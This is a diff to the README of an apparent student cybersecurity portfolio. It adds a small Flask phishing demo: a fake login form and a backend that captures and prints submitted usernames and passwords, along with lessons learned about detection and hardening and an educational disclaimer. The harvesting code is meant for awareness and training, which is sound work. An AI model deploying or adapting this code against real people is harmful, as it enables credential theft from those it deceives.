@@ -66,3 +66,76 @@ git clone https://github.com/amashicyber-a/cyber-security-portfolio.git
 cd cyber-security-portfolio/phishing-project
 pip install flask
 python3 app.py
+```
+
+Open browser:
+http://127.0.0.1:8080
+
+---
+
+## 💻 Project Code
+
+### 🔹 Flask Backend (app.py)
+
+This file handles the web server and captures user credentials submitted through the phishing login page.
+
+```python
+from flask import Flask, request, render_template
+
+app = Flask(__name__)
+
+@app.route('/')
+def login():
+    return render_template('index.html')
+
+@app.route('/login', methods=['POST'])
+def capture():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    print(f"[Captured] Username: {username} | Password: {password}")
+
+    return "Login Failed"
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
+```
+
+### 🔹 Frontend Login Page (index.html)
+
+```html
+<form action="/login" method="post">
+    <input type="text" name="username" placeholder="Enter Email" required>
+    <input type="password" name="password" placeholder="Enter Password" required>
+    <button type="submit">Login</button>
+</form>
+```
+
+---
+
+## 📚 What I Learned
+
+- How phishing attacks capture user credentials
+- Building a web application using Flask
+- Monitoring network traffic using Wireshark
+- Detecting attacks using Suricata IDS
+- Implementing firewall rules using iptables
+- Securing web applications using HTTPS
+
+---
+
+## 🔐 Security Improvements
+
+- Enforced HTTPS using SSL certificates
+- Blocked malicious traffic using iptables firewall rules
+- Detected suspicious activity using Suricata
+- Identified open ports using Nmap
+- Reduced attack surface by restricting unnecessary services
+
+---
+
+## ⚠️ Disclaimer
+
+This project is created for educational purposes only. It demonstrates how phishing attacks work in a controlled environment to improve cybersecurity awareness and defense strategies.
+
+
